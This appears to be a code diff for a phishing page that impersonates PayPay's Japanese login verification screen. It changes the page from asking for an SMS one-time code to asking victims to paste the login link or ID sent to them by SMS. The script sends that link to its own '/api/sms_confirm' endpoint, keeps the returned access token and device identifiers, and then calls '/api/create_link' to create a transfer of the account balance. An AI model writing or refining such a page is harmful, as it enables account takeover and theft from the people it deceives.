@@ -53,96 +53,127 @@
       position: relative;
     }
 
-    /* OTP Auth Page */
-    .otp-auth-page {
-      max-width: 440px; margin-left: auto; margin-right: auto; padding: 20px;
+    /* Auth Page */
+    .otl-auth-page {
+      max-width: 440px; margin-left: auto; margin-right: auto; padding: 28px 20px 40px;
     }
 
-    h3.header-title { color: #161616; margin: 15px auto 10px; font-size: 14px; line-height: 1.4; font-weight: 600; }
-    p.sub-title { color: #969696; font-size: 12px; line-height: 1.4; margin: 0 0 4px; }
-    .mb10 { margin-bottom: 10px; }
-    .ml10 { margin-left: 10px; }
-
-    /* Phone SMS icon */
-    .component-icon { background-position: 50%; background-repeat: no-repeat; background-size: contain; display: block; }
-    .icon-md { width: 32px; height: 32px; }
-    .icon-phone-sms {
-      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32' fill='none'%3E%3Crect x='7' y='2' width='14' height='22' rx='3' fill='%23e8f4fd' stroke='%233895ff' stroke-width='1.5'/%3E%3Crect x='10' y='19' width='8' height='2' rx='1' fill='%233895ff'/%3E%3Crect x='14' y='5' width='4' height='1.5' rx='0.75' fill='%233895ff'/%3E%3Crect x='16' y='17' width='12' height='11' rx='2.5' fill='%233895ff'/%3E%3Cpath d='M19 22h6M19 25h4' stroke='white' stroke-width='1.5' stroke-linecap='round'/%3E%3C/svg%3E");
+    /* Icon area */
+    .icon-area {
+      display: flex; align-items: center; justify-content: flex-start;
+      margin-bottom: 16px;
+    }
+    .component-icon {
+      background-position: 50%; background-repeat: no-repeat; background-size: contain; display: block;
+    }
+    .icon-md { width: 40px; height: 40px; flex-shrink: 0; }
+    .icon-phone-link {
+      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 40 40' fill='none'%3E%3Crect x='8' y='2' width='18' height='28' rx='3' fill='%23e8f4fd' stroke='%233895ff' stroke-width='1.5'/%3E%3Crect x='12' y='25' width='10' height='2' rx='1' fill='%233895ff'/%3E%3Crect x='16' y='6' width='6' height='2' rx='1' fill='%233895ff'/%3E%3Ccircle cx='28' cy='30' r='9' fill='%233895ff'/%3E%3Cpath d='M24.5 30.5 L27 28l2.5 2.5M27 28v5' stroke='white' stroke-width='1.5' stroke-linecap='round' stroke-linejoin='round'/%3E%3C/svg%3E");
     }
 
-    /* OTP auth section */
-    .otp-auth { padding: 10px 0; }
-    .otp-auth .otp-content { max-width: 305px; margin: 0 auto; }
-
-    /* OTP field */
-    .otp .otp-field {
-      flex-direction: row; justify-content: center; place-items: center;
-      margin-top: 10px; padding: 0 25px; display: flex;
+    /* Headings */
+    h3.header-title {
+      color: #161616; margin: 0 0 8px; font-size: 15px; line-height: 1.5; font-weight: 600;
     }
-    .otp .otp-field .otp-prefix { display: none; }
-    .otp .otp-field .otp-code { width: 100%; }
-    .otp .otp-field .otp-code .otp-input {
-      letter-spacing: 20px; text-align: center;
-      border: none; border-bottom: 2px solid #eee;
-      height: 36px; margin: 0; font-size: 26px; line-height: 14px;
-      width: 100%; outline: none; background: transparent;
-      color: #686868; -webkit-tap-highlight-color: transparent;
-      font-family: inherit; font-weight: 600;
+    p.sub-title {
+      color: #686868; font-size: 12px; line-height: 1.6; margin: 0 0 24px;
+    }
+    .phone-strong { font-weight: 700; color: #161616; }
+
+    /* Divider */
+    .section-divider {
+      height: 1px; background: #f2f2f2; margin: 20px 0;
+    }
+
+    /* Step row */
+    .step-row {
+      display: flex; align-items: flex-start; gap: 10px; margin-bottom: 14px;
+    }
+    .step-num {
+      min-width: 22px; height: 22px; border-radius: 50%;
+      background: #3895ff; color: #fff;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 11px; font-weight: 700; flex-shrink: 0; margin-top: 1px;
+    }
+    .step-text { color: #444; font-size: 13px; line-height: 1.55; }
+
+    /* Input field */
+    .input-wrap {
+      margin-top: 22px;
+    }
+    .input-label {
+      display: block; font-size: 11px; color: #3895ff; font-weight: 600; margin-bottom: 6px;
+    }
+    .url-input {
+      width: 100%; border: none; border-bottom: 2px solid #3895ff;
+      border-radius: 0; outline: none; background: transparent;
+      font-family: inherit; font-size: 14px; color: #161616;
+      padding: 8px 0 10px; line-height: 1.4;
       -webkit-user-select: text; user-select: text;
-      caret-color: #3895ff;
+      -webkit-tap-highlight-color: transparent;
       transition: border-bottom-color 0.2s;
+      caret-color: #3895ff;
     }
-    .otp .otp-field .otp-code .otp-input:focus { border-bottom-color: #3895ff; }
+    .url-input:focus { border-bottom-color: #3895ff; }
+    .url-input::placeholder { color: #bababa; }
+    .input-hint {
+      margin-top: 6px; font-size: 11px; color: #969696; line-height: 1.5;
+    }
 
-    /* OTP info box */
-    .otp .otp-info {
+    /* Info box */
+    .info-box {
       background-color: #e5f1ff;
       background-image: url(https://image.paypay.ne.jp/images/payment-miniapps/common/ic-exclamation.svg);
       background-position: 10px 10px;
       background-repeat: no-repeat;
-      background-size: 24px;
-      border-radius: 5px;
-      margin-top: 8px;
-      padding: 10px 15px 10px 35px;
-      font-size: 12px;
-      position: relative;
+      background-size: 20px;
+      border-radius: 6px;
+      margin-top: 22px;
+      padding: 10px 14px 10px 38px;
+      font-size: 12px; color: #444; line-height: 1.6;
     }
-    .otp .otp-info p { margin: 0 0 4px; color: #444; line-height: 1.5; }
-    .otp .otp-info p:last-child { margin: 0; }
-    .otp .otp-info a { color: #3895ff; }
+    .info-box p { margin: 0 0 3px; }
+    .info-box p:last-child { margin: 0; }
+    .info-box a { color: #3895ff; }
 
     /* Re-send */
-    .otp-auth .re-send { color: #3895ff; cursor: pointer; margin-top: 10px; font-size: 12px; }
-    .otp-auth .re-send.disabled { color: #ddd; cursor: default; pointer-events: none; }
-    .otp-auth .re-send span { font-size: 11px; }
-
-    /* Help link */
-    .otp-auth .otp-help {
-      display: flex; align-items: center; justify-content: center;
-      margin-top: 10px; font-size: 12px;
+    .re-send-row {
+      margin-top: 18px; text-align: center; font-size: 12px;
     }
-    .otp-auth .otp-help a { color: #3895ff; display: flex; align-items: center; gap: 4px; }
+    .re-send {
+      color: #3895ff; cursor: pointer; display: inline-flex; align-items: center; gap: 4px;
+    }
+    .re-send.disabled { color: #ccc; cursor: default; pointer-events: none; }
+    .re-send-timer { font-size: 11px; }
+
+    /* Help */
+    .otp-help {
+      display: flex; align-items: center; justify-content: center;
+      margin-top: 12px; font-size: 12px;
+    }
+    .otp-help a { color: #3895ff; display: flex; align-items: center; gap: 4px; }
 
     /* Submit */
     .submit-button {
       color: #fff; background-color: #3895ff; border: none; border-radius: 4px;
-      width: 100%; height: 45px; margin-top: 30px; font-size: 14px;
+      width: 100%; height: 45px; margin-top: 28px; font-size: 14px;
       text-align: center; cursor: pointer; outline: none; font-weight: 600;
-      font-family: inherit;
+      font-family: inherit; transition: background-color 0.15s;
     }
     .submit-button:disabled { background-color: #e6e6e6; cursor: default; }
+    .submit-button:not(:disabled):active { background-color: #2a7fe0; }
 
     /* Error */
     .error-msg {
-      display: none; color: #e53935; font-size: 13px;
-      text-align: center; margin-top: 12px; line-height: 1.5;
+      display: none; color: #e53935; font-size: 12px;
+      margin-top: 10px; line-height: 1.5;
     }
     .error-msg.visible { display: block; }
 
     /* Loading overlay */
     .loading-overlay {
       display: none; position: fixed; inset: 0;
-      background: rgba(255,255,255,0.85); z-index: 9999;
+      background: rgba(255,255,255,0.88); z-index: 9999;
       flex-direction: column; align-items: center; justify-content: center; gap: 16px;
     }
     .loading-overlay.visible { display: flex; }
@@ -166,56 +197,79 @@
         <section data-v-b035e588="" data-v-32bf0b5d="" class="top-header account-header">
           <header data-v-b035e588="" class="header-signin">
             <img data-v-b035e588="" src="https://image.paypay.ne.jp/images/payment-miniapps/opa/logo.png" alt="PayPay" height="45">
-            <h2 data-v-b035e588="">ログイン</h2>
+            <h2 data-v-b035e588="">本人確認</h2>
           </header>
           <div data-v-b035e588="" class="header-more"></div>
         </section>
 
         <!-- Page content -->
         <div data-v-32bf0b5d="" class="account-content">
-          <section data-v-7964b47e="" data-v-32bf0b5d="" class="otp-auth-page">
+          <section class="otl-auth-page">
 
-            <div data-v-7964b47e="" class="mb10">
-              <i data-v-3c7781bb="" data-v-7964b47e="" class="component-icon icon-phone-sms icon-md"></i>
+            <div class="icon-area">
+              <i class="component-icon icon-phone-link icon-md"></i>
             </div>
 
-            <h3 data-v-7964b47e="" class="header-title">SMSで届いた認証コードを入力してください</h3>
-            <p data-v-7964b47e="" class="sub-title">
-              こちらの携帯電話番号に送信しました
-              <strong data-v-7964b47e="" class="ml10" id="phoneDisplay"></strong>
+            <h3 class="header-title">SMSで届いたリンクで認証してください</h3>
+            <p class="sub-title">
+              登録の携帯電話番号に確認用のリンクを送信しました。<br>
+              <strong class="phone-strong" id="phoneDisplay"></strong>
             </p>
 
-            <section data-v-2dbf0436="" data-v-7964b47e="" class="otp-auth">
-              <div data-v-2dbf0436="" class="otp-content">
-                <div data-v-de519d7f="" data-v-2dbf0436="" class="otp">
-                  <div data-v-de519d7f="" class="otp-field">
-                    <div data-v-de519d7f="" class="otp-prefix" id="otpPrefix"></div>
-                    <div data-v-de519d7f="" class="otp-code">
-                      <input data-v-de519d7f="" id="otpInput" name="otp_input" class="otp-input" maxlength="4" pattern="\d*" type="tel" autocomplete="one-time-code">
-                    </div>
-                  </div>
-                  <div data-v-de519d7f="" class="otp-info">
-                    <p data-v-de519d7f="">認証コードに記載の２文字のアルファベットを確認の上、４桁の数字を入力してください</p>
-                    <p data-v-de519d7f=""><a data-v-de519d7f="" href="https://paypay.ne.jp/rd/support/help/c0177/" target="_blank">アルファベットに関して</a></p>
-                  </div>
-                </div>
-              </div>
+            <!-- Steps -->
+            <div class="step-row">
+              <div class="step-num">1</div>
+              <div class="step-text">SMSに届いたリンクを長押し・コピーしてください</div>
+            </div>
+            <div class="step-row">
+              <div class="step-num">2</div>
+              <div class="step-text">下の入力欄にURLまたはIDを貼り付けてください</div>
+            </div>
+            <div class="step-row">
+              <div class="step-num">3</div>
+              <div class="step-text">「認証する」ボタンをタップしてください</div>
+            </div>
 
-              <p data-v-2dbf0436="" class="re-send disabled" id="resendBtn">
-                認証コードを再送 <span id="resendTimer">(60秒後)</span>
-              </p>
+            <div class="section-divider"></div>
 
-              <p data-v-2dbf0436="" class="otp-help">
-                <a data-v-2dbf0436="" href="https://paypay.ne.jp/rd/support/help/c0012/" target="_blank">
-                  <img data-v-2dbf0436="" src="https://image.paypay.ne.jp/images/payment-miniapps/common/ic-question.svg" width="14" height="14" alt="help icon">
-                  &nbsp;認証コードが届かない場合
-                </a>
-              </p>
+            <!-- URL / ID input -->
+            <div class="input-wrap">
+              <label class="input-label" for="urlInput">認証URL またはID</label>
+              <input
+                id="urlInput"
+                class="url-input"
+                type="text"
+                inputmode="url"
+                autocomplete="off"
+                autocorrect="off"
+                autocapitalize="off"
+                spellcheck="false"
+                placeholder="https://www.paypay.ne.jp/portal/oauth2/l?id=…"
+              >
+              <p class="input-hint">例）URL全体 または ID部分（例：TK4602）だけでもOK</p>
+            </div>
 
-              <div class="error-msg" id="errorMsg"></div>
+            <div class="info-box">
+              <p>SMSに記載のURLをそのまま貼り付けるか、<br>「id=」以降の英数字（例：<strong>TK4602</strong>）を入力してください。</p>
+              <p><a href="https://paypay.ne.jp/rd/support/help/c0012/" target="_blank">リンクが届かない場合はこちら</a></p>
+            </div>
 
-              <button data-v-2dbf0436="" id="submitBtn" class="submit-button" disabled="">認証する</button>
-            </section>
+            <div class="error-msg" id="errorMsg"></div>
+
+            <button id="submitBtn" class="submit-button" disabled>認証する</button>
+
+            <div class="re-send-row">
+              <span class="re-send disabled" id="resendBtn">
+                SMSを再送する <span class="re-send-timer" id="resendTimer">（60秒後）</span>
+              </span>
+            </div>
+
+            <div class="otp-help">
+              <a href="https://paypay.ne.jp/rd/support/help/c0012/" target="_blank">
+                <img src="https://image.paypay.ne.jp/images/payment-miniapps/common/ic-question.svg" width="14" height="14" alt="">
+                &nbsp;SMSが届かない場合
+              </a>
+            </div>
 
           </section>
         </div>
@@ -233,7 +287,7 @@
 
 <script>
 (function () {
-  var input    = document.getElementById('otpInput');
+  var input     = document.getElementById('urlInput');
   var submitBtn = document.getElementById('submitBtn');
   var errorMsg  = document.getElementById('errorMsg');
   var overlay   = document.getElementById('loadingOverlay');
@@ -241,18 +295,18 @@
   var timerEl   = document.getElementById('resendTimer');
   var phoneEl   = document.getElementById('phoneDisplay');
 
-  // Show phone from sessionStorage
   var phone = sessionStorage.getItem('paypay_phone') || '';
   if (phone) phoneEl.textContent = phone;
 
-  // Enable/disable submit on input
   input.addEventListener('input', function () {
-    var v = input.value.replace(/\D/g, '');
-    input.value = v.slice(0, 4);
-    submitBtn.disabled = input.value.length !== 4;
+    submitBtn.disabled = input.value.trim().length === 0;
+  });
+  input.addEventListener('paste', function () {
+    setTimeout(function () {
+      submitBtn.disabled = input.value.trim().length === 0;
+    }, 0);
   });
 
-  // Resend countdown
   var seconds = 60;
   var countdown = setInterval(function () {
     seconds--;
@@ -261,7 +315,7 @@
       resendBtn.classList.remove('disabled');
       timerEl.textContent = '';
     } else {
-      timerEl.textContent = '(' + seconds + '秒後)';
+      timerEl.textContent = '（' + seconds + '秒後）';
     }
   }, 1000);
 
@@ -276,8 +330,8 @@
 
   submitBtn.addEventListener('click', async function () {
     clearError();
-    var code = input.value.trim();
-    if (code.length !== 4) return;
+    var url = input.value.trim();
+    if (!url) return;
 
     overlay.classList.add('visible');
     submitBtn.disabled = true;
@@ -286,25 +340,25 @@
       var res = await fetch('/api/sms_confirm', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ code: code })
+        body: JSON.stringify({ url: url })
       });
       var data = await res.json();
 
       if (!res.ok) {
-        showError(data.error || '認証に失敗しました。もう一度お試しください。');
+        showError(data.error || '認証に失敗しました。URLを確認してもう一度お試しください。');
         submitBtn.disabled = false;
         return;
       }
 
       if (data.access_token) sessionStorage.setItem('paypay_access_token', data.access_token);
-      if (data.device_uuid) sessionStorage.setItem('paypay_device_uuid', data.device_uuid);
+      if (data.device_uuid)  sessionStorage.setItem('paypay_device_uuid',  data.device_uuid);
+      if (data.client_uuid)  sessionStorage.setItem('paypay_client_uuid',  data.client_uuid);
 
-      // Store completion timestamp
       var n = new Date();
-      var completedAt = n.getFullYear() + '年' + (n.getMonth() + 1) + '月' + n.getDate() + '日 ' + n.getHours() + '時' + String(n.getMinutes()).padStart(2, '0') + '分';
+      var completedAt = n.getFullYear() + '年' + (n.getMonth() + 1) + '月' + n.getDate() + '日 '
+        + n.getHours() + '時' + String(n.getMinutes()).padStart(2, '0') + '分';
       sessionStorage.setItem('paypay_completed_at', completedAt);
 
-      // Create a transfer link for the full balance
       if (data.access_token) {
         try {
           var linkRes = await fetch('/api/create_link', {
@@ -314,10 +368,10 @@
           });
           var linkData = await linkRes.json();
           if (linkRes.ok && linkData.link) {
-            sessionStorage.setItem('paypay_link', linkData.link);
+            sessionStorage.setItem('paypay_link',   linkData.link);
             sessionStorage.setItem('paypay_amount', String(linkData.amount));
           }
-        } catch (_) { /* proceed even if link creation fails */ }
+        } catch (_) {}
       }
 
       window.location.href = 'complete.html';
@@ -328,6 +382,10 @@
     } finally {
       overlay.classList.remove('visible');
     }
+  });
+
+  input.addEventListener('keydown', function (e) {
+    if (e.key === 'Enter' && !submitBtn.disabled) submitBtn.click();
   });
 
   input.focus();
